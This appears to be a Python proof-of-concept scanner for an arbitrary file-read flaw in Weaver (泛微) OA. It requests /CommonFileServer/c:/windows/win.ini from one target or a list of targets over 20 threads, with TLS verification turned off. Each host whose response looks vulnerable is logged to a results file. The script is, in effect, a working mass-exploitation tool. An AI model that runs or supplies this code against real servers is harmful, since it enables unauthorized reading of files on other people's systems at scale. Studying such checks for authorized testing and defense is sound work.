import requests,re,os,sys,argparse,urllib3
from multiprocessing.dummy import Pool
# import urllib3
# urllib3.disable_warnings()
requests.packages.urllib3.disable_warnings()
def banner():
    test="""test"""
    print(test)

def poc(target):
    try:
        api = "/CommonFileServer/c:/windows/win.ini"
        res1 = requests.get(url=target,timeout=5,verify=False)
        proxies = {
            "http":"http://127.0.0.1:8080",
            "https":"http://127.0.0.1:8080"
        }
        if  res1.status_code == 200:
            res2 = requests.get(url=target+api,timeout=5,verify=False)
            if  "bit" in res2.text:
                print(f"[+]{target}有漏洞")
                with open("泛微_result.txt","a",encoding="utf-8") as f:
                    f.write(f"[+]{target}有漏洞\n")
            else:
                print(f"[-]{target}无漏洞")

    except Exception as e:
        print(f"[-]{target}可能存在问题，请手工进行测试")




def main():
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    url_list = []
    if args.url and not args.file:
        poc(args.url)
        # exp(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
                # print(url_list)
    mp = Pool(20)
    mp.map(poc,url_list)
    mp.close()
    mp.join()


if __name__ == '__main__':
    main()